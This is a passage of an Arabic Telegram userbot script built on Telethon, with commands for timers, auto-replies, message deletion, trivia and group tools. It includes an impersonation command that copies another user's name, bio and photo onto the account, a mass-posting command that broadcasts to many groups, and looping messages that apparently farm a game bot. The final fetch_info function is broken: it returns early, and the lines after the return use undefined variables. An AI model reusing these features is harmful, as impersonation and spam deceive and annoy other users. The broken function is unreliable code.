            reply = await event.reply("✓ تم تعطيل الاسم وإزالة الوقت من الاسم   ‌‎⎙.")
        except Exception as e:
            reply = await event.reply(f"⎙ حدث خطأ أثناء إزالة الوقت من الاسم: {e}")
    else:
        reply = await event.reply("⎙ لم يتم تعيين اسم الحساب.")
    
    await event.delete()  

    await asyncio.sleep(1)
    await reply.delete()  

@client.on(events.NewMessage(from_users='me', pattern='.اضافة قناة اشتراك (.+)'))
async def add_channel(event):
    await event.delete()
    global channel_link
    channel_link = event.pattern_match.group(1)
    with open(channel_link_file, 'wb') as f:
        pickle.dump(channel_link, f)
    await event.reply(f"   ‌‎⎙ تم تعيين رابط القناة إلى: {channel_link}")
    await event.delete()  

@client.on(events.NewMessage(from_users='me', pattern= '.مسح القناة' ))
async def remove_channel(event):
    await event.delete()
    global channel_link
    channel_link = ''
    with open(channel_link_file, 'wb') as f:
        pickle.dump(channel_link, f)
    reply = await event.reply("⎙ تم مسح رابط القناة.")
    await event.delete()  
    await asyncio.sleep(3)
    await reply.delete()  

async def is_subscribed(user_id):
    if not channel_link:
        return True  
    channel_username = re.sub(r'https://t.me/', '', channel_link)
    try:
        offset = 0
        limit = 100
        while True:
            participants = await client(GetParticipantsRequest(
                channel=channel_username,
                filter=ChannelParticipantsSearch(''),
                offset=offset,
                limit=limit,
                hash=0
            ))
            if not participants.users:
                break
            for user in participants.users:
                if user.id == user_id:
                    return True
            offset += len(participants.users)
        return False
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return await is_subscribed(user_id)
    except Exception as e:
        print(f"Error checking subscription: {e}")
        return False

@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
    if event.is_private and not (await event.get_sender()).bot:  
        sender = await event.get_sender()
        if sender.phone == '42777':
            
            return
        if not await is_subscribed(event.sender_id):
            await event.reply(f"لا يمكنك مراسلتي الى بعد الاشتراك في قناتي: {channel_link}")
            await client.delete_messages(event.chat_id, [event.id])
        else:
            message_text = event.raw_text.lower()

@client.on(events.NewMessage(from_users='me', pattern='.del'))
async def delete_message(event):
    await event.delete()
    
    await asyncio.sleep(2)
    await event.delete()
    
    try:
        
        command, keyword = event.raw_text.split(' ', 1)
        keyword = keyword.lower()
        
        if keyword in responses:
            del responses[keyword]
            
            with open(response_file, 'wb') as f:
                pickle.dump(responses, f)
            
            
            confirmation_message = await event.reply("✓ تم حذف الرد   ‌‎⎙")
            
            
            await asyncio.sleep(2)
            await confirmation_message.delete()
        else:
            warning_message = await event.reply("⎙ لم يتم العثور على الكلمة المحددة")
            
            
            await asyncio.sleep(2)
            await warning_message.delete()
    
    
    except ValueError:
        error_message = await event.reply("⎙ استخدم الصيغة: del الكلمة المفتاحية")
        
        
        await asyncio.sleep(2)
        await error_message.delete()

@client.on(events.NewMessage(from_users='me', pattern='.عداد'))
async def countdown_timer(event):
    await event.delete()
    try:
        
        command, args = event.raw_text.split(' ', 1)
        minutes = int(args.strip().strip('()'))

        
        if event.chat_id in active_timers:
            active_timers[event.chat_id].cancel()
            del active_timers[event.chat_id]
            
            if event.chat_id in countdown_messages:
                await client.delete_messages(event.chat_id, countdown_messages[event.chat_id])
                del countdown_messages[event.chat_id]

        async def timer_task():
            nonlocal minutes
            total_seconds = minutes * 60
            
            countdown_message = await event.reply("**   ‌‎⎙ سيبدأ العد التنازلي بعد 3 **")

            
            countdown_messages[event.chat_id] = countdown_message.id

            
            await asyncio.sleep(1)
            await countdown_message.edit("   ‌‎⎙** سيبدأ العد التنازلي بعد 2 **")


            
            await asyncio.sleep(1)
            
            
            countdown_message = await countdown_message.edit(f"   ‌‎⎙** سيبدأ العد التنازلي بعد 1**")
            
            
            while total_seconds > 0:
                minutes, seconds = divmod(total_seconds, 60)
                new_text = f"   ‌‎⎙** {minutes:02}:{seconds:02} متبقية**"
                await asyncio.sleep(1)
                total_seconds -= 1

                try:
                    if new_text != countdown_message.text:
                        await countdown_message.edit(new_text)
                except MessageNotModifiedError:
                    pass
            
            await countdown_message.edit("   ‌‎⎙ **الوقت انتهى!**")
            
            

        
        active_timers[event.chat_id] = asyncio.create_task(timer_task())
        
    except (ValueError, IndexError):
        await event.reply("⎙ استخدم الصيغة الصحيحة: عداد (عدد الدقائق)")

@client.on(events.NewMessage(from_users='me', pattern='.توقيف'))
async def stop_timers(event):
    await event.delete()
    if event.chat_id in active_timers:
        
        active_timers[event.chat_id].cancel()
        del active_timers[event.chat_id]
        
        
        if event.chat_id in countdown_messages:
            try:
                await client.delete_messages(event.chat_id, countdown_messages[event.chat_id])
                del countdown_messages[event.chat_id]
            except Exception as e:
                print(f"Error deleting countdown message: {e}")

        
        stop_message = await event.reply("⎙ تم إيقاف جميع العدادات التنازلية.")
        
        
        await asyncio.sleep(3)
        await stop_message.delete()
    else:
        
        no_timer_message = await event.reply("   ‌‎⎙ لا توجد عدادات تنازلية نشطة لإيقافها.")
        
        
        await asyncio.sleep(3)
        await no_timer_message.delete()

@client.on(events.NewMessage(from_users='me', pattern='.الاسم'))
async def set_account_name(event):
    await event.delete()
    global account_name
    try:
        
        command, text = event.raw_text.split(' ', 1)
        if '(' in text and ')' in text:
            account_name = text.split('(', 1)[1].split(')')[0].strip()
        else:
            await event.reply("⚠️ استخدم الصيغة: .الاسم (الاسم الجديد)")
            return
        
        
        iraq_tz = tz.gettz('Asia/Baghdad')
        now = datetime.now(iraq_tz)
        current_time = superscript_time(now.strftime("%I:%M"))
        new_username = f"{account_name} - {current_time}"
        
        try:
            await client(UpdateProfileRequest(first_name=new_username))
            await event.reply(f"✓ تم تغيير اسم الحساب إلى {new_username}⎙")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            await client(UpdateProfileRequest(first_name=new_username))
            await event.reply(f"⎙ تم تغيير اسم الحساب إلى {new_username}")
        except Exception as e:
            await event.reply(f"⎙ حدث خطأ أثناء تغيير الاسم: {e}")
    except ValueError:
        await event.reply("⎙ استخدم الصيغة: .الاسم (الاسم الجديد)")

@client.on(events.NewMessage(from_users='me', pattern='.مسح'))
async def delete_messages(event):
    await event.delete()
    try:
        
        command, num_str = event.raw_text.split(' ', 1)
        num_messages = int(num_str.strip('()'))
        
        if num_messages <= 0:
            await event.reply("⚠️ يجب أن يكون عدد الرسائل المراد حذفها أكبر من صفر.")
            return
        
        
        messages = await client.get_messages(event.chat_id, limit=num_messages)
        message_ids = [msg.id for msg in messages]
        
        if message_ids:
            await client(DeleteMessagesRequest(id=message_ids))
            confirmation_message = await event.reply(f"⎙ تم مسح {num_messages} رسالة.")
            
            
            await asyncio.sleep(2)
            await client(DeleteMessagesRequest(id=[confirmation_message.id]))
        else:
            await event.reply("⎙ لم يتم العثور على رسائل للحذف.")
    except (ValueError, IndexError):
        await event.reply("⎙ استخدم الصيغة: مسح (عدد الرسائل)")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ أثناء حذف الرسائل: {e}")


profile_saved = False


async def save_my_profile():
    
    user = await client.get_me()

    
    if not os.path.exists("imagee"):
        os.mkdir("imagee")

    
    current_name = user.first_name  
    current_bio = (await client(GetFullUserRequest(user.id))).full_user.about or ""  
    
    with open("account_info.txt", "w", encoding="utf-8") as f:
        f.write(f"Name: {current_name}\nBio: {current_bio}")
    
    
    if user.photo:
        photo_path = await client.download_profile_photo(user.id, file=f"imagee/my_profile.jpg")
        if photo_path and os.path.exists(photo_path):
            print("⎙ تم حفظ صورة حسابك بنجاح.")
        else:
            print("⎙ تعذر حفظ صورة حسابك.")
    else:
        print("⎙ لا يوجد صورة لحسابك.")

    print(f"⎙ تم حفظ اسمك وبايو حسابك: {current_name}, {current_bio}")


async def impersonate_user(event):
    global profile_saved

    
    if not profile_saved:
        await save_my_profile()
        profile_saved = True  

    
    if event.is_reply:
        reply_message = await event.get_reply_message()
        user = await client(GetFullUserRequest(reply_message.sender_id))

        
        new_name = user.users[0].first_name  
        new_bio = user.full_user.about if user.full_user.about else ""  
        
        try:
            await client(UpdateProfileRequest(first_name=new_name, about=new_bio))
            await event.delete()
            await event.reply(f"⎙ تم تغيير الاسم إلى {new_name} والبايو إلى: {new_bio}")
        except Exception as e:
            await event.reply(f"⎙ حدث خطأ أثناء تحديث الاسم أو البايو: {e}")

        
        if user.users[0].photo:
            
            if not os.path.exists("hh"):
                os.mkdir("hh")

            
            photo_path = await client.download_profile_photo(user.users[0].id, file=f"hh/{user.users[0].id}.jpg")
            
            
            if photo_path and os.path.exists(photo_path):
                try:
                    
                    await client(DeletePhotosRequest(await client.get_profile_photos('me')))
                    
                    
                    uploaded_file = await client.upload_file(photo_path)

                    
                    await client(UploadProfilePhotoRequest(file=uploaded_file))
                    
                    await event.delete()
                    await event.reply("⎙ تم تغيير صورة الحساب")
                except (StickerMimeInvalidError, PhotoExtInvalidError, PhotoCropSizeSmallError, ImageProcessFailedError) as e:
                    await event.reply(f"⎙ حدث خطأ أثناء معالجة الصورة: {e}")
                except Exception as e:
                    await event.reply(f"⎙ حدث خطأ غير محدد أثناء تغيير صورة الحساب: {e}")
            else:
                await event.reply("⎙ لا يملك المستخدم صورة أو تعذر تحميل الصورة.")
        else:
            await event.reply("⎙ لا يملك المستخدم صورة.")


async def restore_profile(event):
    try:
        
        if os.path.exists("account_info.txt"):
            with open("account_info.txt", "r", encoding="utf-8") as f:
                data = f.readlines()
                restored_name = data[0].replace("Name: ", "").strip()
                restored_bio = data[1].replace("Bio: ", "").strip()
            
            await client(UpdateProfileRequest(first_name=restored_name, about=restored_bio))
            await event.delete()
            await event.reply(f"⎙ تم استرجاع الاسم إلى {restored_name} والبايو إلى: {restored_bio}")
        else:
            await event.reply("⎙ ملف الحساب غير موجود.")

        
        photo_path = "imagee/my_profile.jpg"  
        if os.path.exists(photo_path):
            uploaded_file = await client.upload_file(photo_path)

            
            await client(DeletePhotosRequest(await client.get_profile_photos('me')))

            
            await client(UploadProfilePhotoRequest(file=uploaded_file))
            
            await event.delete()
            await event.reply("⎙ تم استرجاع صورة الحساب بنجاح.")
        else:
            await event.reply("⎙ تعذر العثور على الصورة المحفوظة.")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ أثناء استرجاع الحساب: {e}")


@client.on(events.NewMessage(from_users='me', pattern='.انتحال'))
async def handle_impersonate(event):
    await impersonate_user(event)
    await event.delete()


@client.on(events.NewMessage(from_users='me', pattern='.ارجاع'))
async def handle_restore(event):
    await restore_profile(event)
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.نشر مجموعات'))
async def publish_message(event):
    await event.delete()
    try:
        
        command, args = event.raw_text.split(' ', 1)
        num_groups, message = args.split('(', 1)[1].split(')')[0], args.split(')', 1)[1].strip()
        num_groups = int(num_groups)
        
        
        dialogs = await client.get_dialogs()
        groups = [dialog for dialog in dialogs if dialog.is_group]
        
        if len(groups) < num_groups:
            await event.reply(f"⎙ عدد المجموعات المتاحة أقل من {num_groups}.")
            return
        
        
        published_message_ids = []
        for group in groups[:num_groups]:
            msg = await client.send_message(group, message)
            published_message_ids.append((group.id, msg.id))
        
        
        published_messages.append({
            'message': message,
            'group_ids': [group.id for group in groups[:num_groups]],
            'message_ids': published_message_ids
        })
        with open(published_messages_file, 'wb') as f:
            pickle.dump(published_messages, f)
        
        await event.reply(f"⎙ تم نشر الرسالة في {num_groups} مجموعة.")
    except (ValueError, IndexError):
        await event.reply("⎙ استخدم الصيغة: نشر (عدد المجموعات) الرسالة")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ أثناء نشر الرسالة: {e}")


if os.path.exists(muted_users_file):
    with open(muted_users_file, 'rb') as f:
        muted_users = pickle.load(f)
else:
    muted_users = set()


@client.on(events.NewMessage(from_users='me', pattern='.كتم'))
async def mute_user(event):
    await event.delete()
    if event.is_private:
        muted_users.add(event.chat_id)
        with open(muted_users_file, 'wb') as f:
            pickle.dump(muted_users, f)
        await event.reply(" **⌔┊تم الكتم المستخدم ⌔┊نحن بحاجة لبعض الهدوء اصمت ⌔┊تم كتمـه بنجـاح ☑️**")
    else:
        await event.reply("⎙ يمكن استخدام هذا الأمر في المحادثات الخاصة فقط.")

@client.on(events.NewMessage(from_users='me', pattern='.سماح'))
async def unmute_user(event):
    await event.delete()
    if event.is_private and event.chat_id in muted_users:
        muted_users.remove(event.chat_id)
        with open(muted_users_file, 'wb') as f:
            pickle.dump(muted_users, f)
        await event.reply("⎙ تم السماح للمستخدم للتحدث معك ايها الملك.")
    else:
        await event.reply("⎙ هذا المستخدم غير مكتوم")

@client.on(events.NewMessage(from_users='me', pattern='.المكتومين'))
async def show_muted_users(event):
    await event.delete()
    if muted_users:
        muted_users_list = "\n".join([str(user_id) for user_id in muted_users])
        await event.reply(f"⎙ المستخدمون المكتومون:\n{muted_users_list}")
    else:
        await event.reply("⎙ لا يوجد مستخدمون مكتومون حالياً.")

from telethon import functions

active_ratib_timers = {}
active_bakhsheesh_timers = {}
active_sarqa_timers = {}

@client.on(events.NewMessage(from_users='me', pattern='.راتب'))
async def enable_ratib_wad(event):
    await event.delete()
    reply = await event.respond("تم تفعيل أمر راتب")
    await asyncio.sleep(1)
    await reply.delete()

    if event.chat_id not in active_ratib_timers:
        async def send_ratib():
            while True:
                await client.send_message(event.chat_id, "راتب")
                await asyncio.sleep(660)  

        active_ratib_timers[event.chat_id] = asyncio.create_task(send_ratib())

@client.on(events.NewMessage(from_users='me', pattern='.ايقاف راتب'))
async def disable_ratib_wad(event):
    await event.delete()

    if event.chat_id in active_ratib_timers:
        active_ratib_timers[event.chat_id].cancel()
        del active_ratib_timers[event.chat_id]
    
    reply = await event.respond("⎙ تم إيقاف أمر راتب")
    await asyncio.sleep(2)
    await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.بخشيش'))
async def enable_bakhsheesh_wad(event):
    await event.delete()
    reply = await event.respond("⎙ تم تفعيل أمر بخشيش")
    await asyncio.sleep(2)
    await reply.delete()

    if event.chat_id not in active_bakhsheesh_timers:
        async def send_bakhsheesh():
            while True:
                await client.send_message(event.chat_id, "بخشيش")
                await asyncio.sleep(660)  

        active_bakhsheesh_timers[event.chat_id] = asyncio.create_task(send_bakhsheesh())

@client.on(events.NewMessage(from_users='me', pattern='.ايقاف بخشيش'))
async def disable_bakhsheesh_wad(event):
    await event.delete()

    if event.chat_id in active_bakhsheesh_timers:
        active_bakhsheesh_timers[event.chat_id].cancel()
        del active_bakhsheesh_timers[event.chat_id]
    
    reply = await event.respond("⎙ تم إيقاف أمر بخشيش")
    await asyncio.sleep(2)
    await reply.delete()

active_sarqa_timers = {}

@client.on(events.NewMessage(from_users='me', pattern='.سرقة(?: (\d+))?'))
async def enable_sarqa_wad(event):
    await event.delete()

    if event.pattern_match.group(1):
        user_id = int(event.pattern_match.group(1))

        if user_id not in active_sarqa_timers:
            reply = await event.respond("⎙ تم تفعيل أمر سرقة")
            await asyncio.sleep(2)
            await reply.delete()

            async def send_sarqa():
                while True:
                    try:
                        async for message in client.iter_messages(event.chat_id, from_user=user_id, limit=1):
                            await client.send_message(event.chat_id, "زرف", reply_to=message.id)
                        await asyncio.sleep(6)  
                    except Exception as e:
                        print(f"Error: {e}")
                        break

            active_sarqa_timers[user_id] = asyncio.create_task(send_sarqa())
        else:
            reply = await event.respond("⎙ تم تفعيل أمر سرقة مسبقًا.")
            await asyncio.sleep(2)
            await reply.delete()
    else:
        reply = await event.respond("يرجى كتابة ايدي الشخص مع الامر!")
        await asyncio.sleep(2)
        await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ايقاف سرقة(?: (\d+))?'))
async def disable_sarqa_wad(event):
    await event.delete()

    if event.pattern_match.group(1):
        user_id = int(event.pattern_match.group(1))

        if user_id in active_sarqa_timers:
            active_sarqa_timers[user_id].cancel()
            del active_sarqa_timers[user_id]
            
            reply = await event.respond("⎙ تم إيقاف أمر سرقة")
            await asyncio.sleep(2)
            await reply.delete()
        else:
            reply = await event.respond("⎙ لم يتم تفعيل أمر سرقة وعد لهذا الشخص.")
            await asyncio.sleep(2)
            await reply.delete()
    else:
        reply = await event.respond("يرجى كتابة ايدي الشخص مع الامر!")
        await asyncio.sleep(2)
        await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.رفع طيز'))
async def enable_ratib_wad(event):
    await event.delete()
    reply = await event.respond("تم رفعه طيز بنجاح ⎙")
    await asyncio.sleep(1)
    await reply.delete()
    
@client.on(events.NewMessage(outgoing=True, pattern=r'\.مغادرة القنوات'))
async def leave_channels(event):
    await event.edit("**جارٍ مغادرة القنوات...**")
    async for dialog in client.iter_dialogs():
        if dialog.is_channel and not (dialog.is_group or dialog.entity.admin_rights or dialog.entity.creator):
            await client.delete_dialog(dialog)
    await event.edit("**تم مغادرة جميع القنوات**")

@client.on(events.NewMessage(outgoing=True, pattern=r'\.مغادرة الكروبات'))
async def leave_groups(event):
    await event.edit("**جارٍ مغادرة الكروبات...**")
    async for dialog in client.iter_dialogs():
        if dialog.is_group and not (dialog.entity.admin_rights or dialog.entity.creator):
            try:
                await client.delete_dialog(dialog)
            except Exception as e:
                print(f"حدث خطأ أثناء مغادرة الكروب {dialog.name}: {e}")  # طباعة الخطأ للمساعدة في تحديد المشكلة
    await event.edit("**تم مغادرة جميع الكروبات**")
    
@client.on(events.NewMessage(pattern=r'\.بنج$'))
async def ping(event):
    client.parse_mode = "html" 
    start = datetime.now()
    msg = await event.edit("سرعة الانترنيت!")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    await msg.edit(f"<b>سرعة انترنتك!!<b/>\n`{ms} ms`")
        
questions_list = [
    "هل تحب ايفا ؟",
    "حكي ودك يوصل للشخص المطلوب ؟",
    "منشن شخص تسولف معه تنسى هموم الدنيا ؟",
    "مقوله او مثل او بيت شعر قريب من قلبك؟",
    "اكثر مكان تحب تروح له ف الويكند ؟",
    "كم وجبه تآكل ف اليوم ؟",
    "كم ساعه تنام ف اليوم ؟",
    "هل وثقت ف احد و خذلك ؟",
    "كلمه تعبر عن شعورك ؟",
    "منشن شخص فاهمك ف كل شيء ؟",
    "منشن شخص تسولف معه تنسى هموم الدنيا ؟",
    "اصدقاء المواقع افضل من الواقع تتفق؟",
    "كلمه معينه م يفهمها الا اصحابك ؟",
    "كل شيء يهون الا ؟",
    "كلمه تعبر عن شعورك ؟",
    "كيف تتصرف مع شخص تكلمه في سالفه مهمه ويصرفك ومعد يرد ابداً؟",
    "ثلاث اشياء جنبك الحين ؟",
    "تشوف انو التواصل بشكل يومي من اساسيات الحب ؟",
    "نوعيات ودك ينقرضون من تويتر؟",
    "ماذا تفعل عندما تري دموع زوجتك..؟",
    "ما هي هوايتك المفضلة؟",
    "لو خيروك تسافر لأي مكان في العالم، وين بتروح؟",
    "ايش اكثر اكلة تحبها؟",
    "ايش اكثر لون تحبه؟",
    "تحب القهوة او الشاي؟",
    "ايش موقف صار لك ما تنساه؟",
    "ايش اكثر شيء يضايقك؟",
    "ايش اكثر شيء يسعدك؟",
    "ايش هي امنيتك في الحياة؟",
    "لو كان بإمكانك تغيير شيء واحد في العالم، ماذا سيكون؟",
    "هل تؤمن بالحب من اول نظرة؟",
    "هل انت شخص صباحي او مسائي؟",
    "ما هو برجك؟",
    "ما هو فيلمك المفضل؟",
    "ما هي اغنيتك المفضلة؟",
    "ما هي فرقتك الموسيقية المفضلة؟",
    "ما هو كتابك المفضل؟",
    "ما هو مسلسل Netflix  المفضل لديك؟",
    "هل تفضل الصيف او الشتاء؟",
    "هل تفضل العيش في المدينة او الريف؟",
    "هل تفضل الكلاب او القطط؟",
    "ما هو رأيك في وسائل التواصل الاجتماعي؟",
    "ما هي نصيحتك لأي شخص يمر بيوم سيء؟",
    "ما هو الشيء الذي تفتخر به؟",
    "ما هو الشيء الذي تخاف منه؟",
    "ما هو الشيء الذي يجعلك تضحك؟",
    "ما هو الشيء الذي يجعلك تبكي؟",
    "ما هو الشيء الذي يجعلك تشعر بالامتنان؟",
    "ما هو تعريفك للسعادة؟",
    "ما هو تعريفك للنجاح؟",
    "لو كان بإمكانك امتلاك اي قوة خارقة، ماذا ستختار؟",
    "لو كان بإمكانك العودة بالزمن، الى اي فترة زمنية ستعود؟",
    "من هو مثلك الأعلى؟",
    "ما هي أكبر غلطة سويتها في حياتك؟",
    "ما هو الدرس اللي تعلمته من هذي الغلطة؟",
    "ما هي أفضل نصيحة  انعطت لك؟",
    "ايش اكثر شيء تعلمته من والديك؟",
    "ايش اكثر شيء تحبه في نفسك؟",
    "ايش اكثر شيء تكرهه في نفسك؟",
    "كيف تصف نفسك في ثلاث كلمات؟",
    "ما هو الشيء الذي يميزك عن غيرك؟",
    "ما هي طموحاتك المستقبلية؟",
    "ما هو الشيء الذي تتمنى تحقيقه قبل ما تموت؟",
    "هل تؤمن بالحياة بعد الموت؟",
    "هل تؤمن بالأشباح؟",
    "هل تؤمن بالكائنات الفضائية؟",
    "ما هو رأيك في الذكاء الاصطناعي؟",
    "هل تعتقد أن الروبوتات ستسيطر على العالم؟",
    "ما هو الشيء الذي يجعلك تشعر بالغضب؟",
    "ما هو الشيء الذي يجعلك تشعر بالخجل؟",
    "ما هو الشيء الذي يجعلك تشعر بالذنب؟",
    "ما هو الشيء الذي يجعلك تشعر بالخوف؟",
    "ما هو الشيء الذي يجعلك تشعر بالحزن؟",
    "ما هو الشيء الذي يجعلك تشعر بالوحدة؟",
    "ما هو الشيء الذي يجعلك تشعر بالقلق؟",
    "ما هو الشيء الذي يجعلك تشعر بالإحباط؟",
    "ما هو الشيء الذي يجعلك تشعر بالملل؟",
    "ما هو الشيء الذي يجعلك تشعر بالتعب؟",
    "ما هو الشيء الذي يجعلك تشعر بالجوع؟",
    "ما هو الشيء الذي يجعلك تشعر بالعطش؟",
    "ما هو الشيء الذي يجعلك تشعر بالنعاس؟",
    "ما هو الشيء الذي يجعلك تشعر بالبرد؟",
    "ما هو الشيء الذي يجعلك تشعر بالحر؟",
    "ما هو الشيء الذي يجعلك تشعر بالألم؟",
    "ما هو الشيء الذي يجعلك تشعر بالراحة؟",
    "ما هو الشيء الذي يجعلك تشعر بالحب؟",
    "ما هو الشيء الذي يجعلك تشعر بالكراهية؟",
    "ما هو الشيء الذي يجعلك تشعر بالغيرة؟",
    "ما هو الشيء الذي يجعلك تشعر بالحسد؟",
    "ما هو الشيء الذي يجعلك تشعر بالندم؟",
    "ما هو الشيء الذي يجعلك تشعر بالذل؟",
    "ما هو الشيء الذي يجعلك تشعر بالمهانة؟",
    "ما هو الشيء الذي يجعلك تشعر بالظلم؟",
    "ما هو الشيء الذي يجعلك تشعر بالغفران؟",
    "ما هو الشيء الذي يجعلك تشعر بالشكر؟",
    "ما هو الشيء الذي يجعلك تشعر بالاحترام؟",
    "ما هو الشيء الذي يجعلك تشعر بالتقدير؟",
    "ما هو الشيء الذي يجعلك تشعر بالثقة؟",
    "ما هو الشيء الذي يجعلك تشعر بالأمان؟",
    "ما هو الشيء الذي يجعلك تشعر بالسعادة؟"
]


image_links = [
    "https://t.me/Sk_x2/10",
    "https://t.me/Sk_x2/11",
    "https://t.me/Sk_x2/12",
    "https://t.me/Sk_x2/13",
    "https://t.me/Sk_x2/14",
    "https://t.me/Sk_x2/15",
    "https://t.me/Sk_x2/16",
    "https://t.me/Sk_x2/17",
    "https://t.me/Sk_x2/18",
    "https://t.me/Sk_x2/19",
    "https://t.me/Sk_x2/20",
    "https://t.me/Sk_x2/21",
    "https://t.me/Sk_x2/22",
    "https://t.me/Sk_x2/23",
    "https://t.me/Sk_x2/24",
    "https://t.me/Sk_x2/25",
    "https://t.me/Sk_x2/26",
    "https://t.me/Sk_x2/27",
    "https://t.me/Sk_x2/28",
    "https://t.me/Sk_x2/29",
    "https://t.me/Sk_x2/30",
    "https://t.me/Sk_x2/31",
    "https://t.me/Sk_x2/32",
    "https://t.me/Sk_x2/33",
    "https://t.me/Sk_x2/34",
    "https://t.me/Sk_x2/35",
    "https://t.me/Sk_x2/36",
    "https://t.me/Sk_x2/37",
    "https://t.me/Sk_x2/38",
    "https://t.me/Sk_x2/39",
    "https://t.me/Sk_x2/40",
    "https://t.me/Sk_x2/41",
    "https://t.me/Sk_x2/42",
    "https://t.me/Sk_x2/43",
    "https://t.me/Sk_x2/44",
    "https://t.me/Sk_x2/45",
    "https://t.me/Sk_x2/46",
    "https://t.me/Sk_x2/47",
    "https://t.me/Sk_x2/48",
    "https://t.me/Sk_x2/49",
    "https://t.me/Sk_x2/50",
    "https://t.me/Sk_x2/51",
    "https://t.me/Sk_x2/52",
    "https://t.me/Sk_x2/53",
    "https://t.me/Sk_x2/54",
    "https://t.me/Sk_x2/55",
    "https://t.me/Sk_x2/56",
    "https://t.me/Sk_x2/57",
    "https://t.me/Sk_x2/58",
    "https://t.me/Sk_x2/59",
    "https://t.me/Sk_x2/60",
    "https://t.me/Sk_x2/61",
    "https://t.me/Sk_x2/62",
    "https://t.me/Sk_x2/63",
    "https://t.me/Sk_x2/64",
    "https://t.me/Sk_x2/65",
    "https://t.me/Sk_x2/66",
    "https://t.me/Sk_x2/67",
    "https://t.me/Sk_x2/68",
    "https://t.me/Sk_x2/69",
    "https://t.me/Sk_x2/70",
    "https://t.me/Sk_x2/71",
    "https://t.me/Sk_x2/72",
    "https://t.me/Sk_x2/73",
    "https://t.me/Sk_x2/74",
    "https://t.me/Sk_x2/75",
    "https://t.me/Sk_x2/76",
    "https://t.me/Sk_x2/77",
    "https://t.me/Sk_x2/78",
    "https://t.me/Sk_x2/79",
    "https://t.me/Sk_x2/80",
    "https://t.me/Sk_x2/81",
    "https://t.me/Sk_x2/82",
    "https://t.me/Sk_x2/83",
    "https://t.me/Sk_x2/84",
    "https://t.me/Sk_x2/85",
    "https://t.me/Sk_x2/86",
    "https://t.me/Sk_x2/87",
    "https://t.me/Sk_x2/88",
    "https://t.me/Sk_x2/89",
    "https://t.me/Sk_x2/90",
    "https://t.me/Sk_x2/91",
    "https://t.me/Sk_x2/92",
    "https://t.me/Sk_x2/93",
    "https://t.me/Sk_x2/94",
    "https://t.me/Sk_x2/95",
    "https://t.me/Sk_x2/96",
    "https://t.me/Sk_x2/97"
]













@client.on(events.NewMessage(outgoing=True, pattern=r"(^\.كت|\s\.كت)\b|\.انمي"))
async def why(event):
    await event.delete()
    chat = await event.get_chat()

    matched_command = event.pattern_match.string
    if matched_command == ".كت":
        message = random.choice(questions_list)
        await event.client.send_message(chat, message)

    elif matched_command == ".انمي":
        while True:
            try:
                random_image_link = random.choice(image_links)
                channel_name, message_id = random_image_link.split('/')[-2:]
                message = await client.get_messages(channel_name, ids=int(message_id))
                await client.send_message(chat, "صور انمي:", file=message, silent=True)
                break
            except WebpageMediaEmptyError:
                pass
            
@client.on(events.NewMessage(pattern="\.كشف المجموعة(?: |$)(.*)", outgoing=True))
async def info_gop(event):
    await event.edit("`جارٍ الفحص ...`")
    chat = await get_chatinfo(event)
    caption = await fetch_info(chat, event)
    try:
        await event.edit(caption, parse_mode="html")
    except Exception as e:
        print("Exception:", e)
        await event.edit("`حدث خطأ غير متوقع.`")
    return

async def get_chatinfo(event):
    chat = event.pattern_match.group(1)
    chat_info = None
    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass
    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
            else:
                chat = event.chat_id
    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except ChannelInvalidError:
        await event.edit("`حدث خطأ في القناة أو المجموعة..`")
        return None
    except ChannelPrivateError:
        await event.edit("`هذه قناة/مجموعة خاصة أو تم حظري منها`")
        return None
    except ChannelPublicGroupNaError:
        await event.edit("`القناة أو المجموعة غير موجودة`")
        return None
    except (TypeError, ValueError) as err:
        await event.edit(str(err))
        return None
    return chat_info

async def fetch_info(chat, event):
    chat_obj_info = await event.client.get_entity(chat.full_chat.id)
    broadcast = getattr(chat_obj_info, "broadcast", False)
    chat_type = "قناة" if broadcast else "مجموعة"
    chat_title = chat_obj_info.title
    warn_emoji = emojize(":warning:")
    # باقي الكود...
    caption = "<b>المعلومات المتاحة:</b>\n"
    caption += f"المعرف: <code>{chat_obj_info.id}</code>\n"
    if chat_title is not None:
        caption += f"اسم {chat_type}: {chat_title}\n"
    # باقي الكود...
    return caption
    if former_title is not None:  
        caption += f"الاسم السابق: {former_title}\n"
    if username is not None:
        caption += f"نوع {chat_type}: عامة\n"
        caption += f"الرابط: {username}\n"
    else:
       caption += f"نوع {chat_type}: خاصة\n"
    if creator_username is not None:
        caption += f"منشئ {chat_type}: {creator_username}\n"
    elif creator_valid:
        caption += f"منشئ {chat_type}: <a href=\"tg://user?id={creator_id}\">{creator_firstname}</a>\n"
    if created is not None:
        caption += f"تاريخ الإنشاء: <code>{created.date().strftime('%b %d, %Y')} - {created.time()}</code>\n"
    else:
        caption += f"تاريخ الإنشاء: <code>{chat_obj_info.date.date().strftime('%b %d, %Y')} - {chat_obj_info.date.time()}</code> {warn_emoji}\n"
    caption += f"معرف مركز البيانات: {dc_id}\n"
    if exp_count is not None:
        chat_level = int((1+sqrt(1+7*exp_count/14))/2)
        caption += f"مستوى {chat_type}: <code>{chat_level}</code>\n"
    if messages_viewable is not None:
        caption += f"الرسائل القابلة للعرض: <code>{messages_viewable}</code>\n"
    if messages_sent:
        caption += f"الرسائل المرسلة: <code>{messages_sent}</code>\n"
    elif messages_sent_alt:
        caption += f"الرسائل المرسلة: <code>{messages_sent_alt}</code> {warn_emoji}\n"
    if members is not None:
        caption += f"الأعضاء: <code>{members}</code>\n"
    if admins is not None:
        caption += f"المشرفون: <code>{admins}</code>\n"
    if bots_list:
        caption += f"البوتات: <code>{bots}</code>\n"
    if members_online:
        caption += f"الأعضاء المتصلون الآن: <code>{members_online}</code>\n"
